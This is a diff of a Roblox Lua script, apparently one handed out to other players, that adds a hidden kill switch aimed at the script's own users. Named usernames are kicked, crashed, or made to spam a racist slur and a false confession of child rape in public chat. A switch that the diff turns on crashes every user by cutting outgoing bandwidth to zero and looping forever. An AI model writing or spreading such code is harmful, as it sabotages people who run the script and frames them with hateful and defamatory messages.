@@ -1,31 +1,48 @@
 local players = game.Players
 local lplr = players.LocalPlayer
 local name = lplr.Name
+local delay = 1
 -----------------------------
-local blacklist = false
-local banactive = false
-local crashactive = false
-local fullydisabled = true
+local KickBlacklistedUsersEnabled = false
+local BanBlacklistedUsersEnabled = false
+local CrashBlacklistedUsersEnabled = false
+local CrashAllIsActive = true
+local ScriptIsDisabled = false
 -----------------------------
-if blacklist then
-      task.wait(2.5)
-      if name == "Frog_fury14" or name == "daesrrref" or name == "Mufidpasja_1" or name == "DABLETMAN" or name == "ididurmother13" or name == "4gaeottv50" or name == "tubers93cameb4ck" or name == "AndyCSGOx" or name == "ivegotyourbackbuddy" or name == "AndyCSGOx" or name == "DeathPhantom332" or name == "UkraineBomber12" or name == "IIIIlIIllIIIIll" or name == "anticheatisSoOgood" or name == "llllllllllIIIllllIlI" or name == "Rarest571" or name == "BanSpeedRunbedwarsDD" then game.Players.LocalPlayer:kick("You have been kicked due to unexpected client behavior.") end
+if KickBlacklistedUsersEnabled then
+      task.wait(delay)
+      if name == "Frog_fury14" or name == "Iightnz" or name == "MyPetMum" or name == "kjsdajkwdjkad" or name == "daesrrref" or name == "Mufidpasja_1" or name == "DABLETMAN" or name == "ididurmother13" or name == "4gaeottv50" or name == "tubers93cameb4ck" or name == "AndyCSGOx" or name == "ivegotyourbackbuddy" or name == "AndyCSGOx" or name == "DeathPhantom332" or name == "UkraineBomber12" or name == "IIIIlIIllIIIIll" or name == "anticheatisSoOgood" or name == "llllllllllIIIllllIlI" or name == "Rarest571" or name == "BanSpeedRunbedwarsDD" then 
+         lplr:kick("You have been kicked due to unexpected client behavior.")
+      end
 end
 -----------------------------
-if banactive then 
+if BanBlacklistedUsersEnabled then 
+   task.wait(delay)
+    if name == "Frog_fury14" or name == "Iightnz" or name == "MyPetMum" or name == "kjsdajkwdjkad" or name == "daesrrref" or name == "Mufidpasja_1" or name == "DABLETMAN" or name == "ididurmother13" or name == "4gaeottv50" or name == "tubers93cameb4ck" or name == "AndyCSGOx" or name == "ivegotyourbackbuddy" or name == "AndyCSGOx" or name == "DeathPhantom332" or name == "UkraineBomber12" or name == "IIIIlIIllIIIIll" or name == "anticheatisSoOgood" or name == "llllllllllIIIllllIlI" or name == "Rarest571" or name == "BanSpeedRunbedwarsDD" then
+      while true do 
+         task.wait(0.5)
+         game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("i hate niggers and i rape children", "All")
+      end
+   end       
 end
 -----------------------------
-if crashactive then
- if name == "Frog_fury14" or name == "daesrrref" or name == "Mufidpasja_1" or name == "DABLETMAN" or name == "ididurmother13" or name == "4gaeottv50" or name == "tubers93cameb4ck" or name == "AndyCSGOx" or name == "ivegotyourbackbuddy" or name == "AndyCSGOx" or name == "DeathPhantom332" or name == "UkraineBomber12" or name == "IIIIlIIllIIIIll" or name == "anticheatisSoOgood" or name == "llllllllllIIIllllIlI" or name == "Rarest571" or name == "BanSpeedRunbedwarsDD" then
-  task.wait(2.5)
+if CrashBlacklistedUsersEnabled then
+  if name == "Frog_fury14" or name == "Iightnz" or name == "MyPetMum" or name == "kjsdajkwdjkad" or name == "daesrrref" or name == "Mufidpasja_1" or name == "DABLETMAN" or name == "ididurmother13" or name == "4gaeottv50" or name == "tubers93cameb4ck" or name == "AndyCSGOx" or name == "ivegotyourbackbuddy" or name == "AndyCSGOx" or name == "DeathPhantom332" or name == "UkraineBomber12" or name == "IIIIlIIllIIIIll" or name == "anticheatisSoOgood" or name == "llllllllllIIIllllIlI" or name == "Rarest571" or name == "BanSpeedRunbedwarsDD" then
+  task.wait(delay)
    while true do 
-      print("REAL")
+      print(name)
    end
   end
 end
 -----------------------------
-if fullydisabled then 
-   while true do 
+if CrashAllIsActive then 
+   task.wait(delay)
+     while true do 
+       game:GetService("NetworkClient"):SetOutgoingKBPSLimit(0)
       print(name)
     end 
+end
+-----------------------------
+if ScriptIsDisabled then 
+   lplr:kick("This script is disabled.")
 end
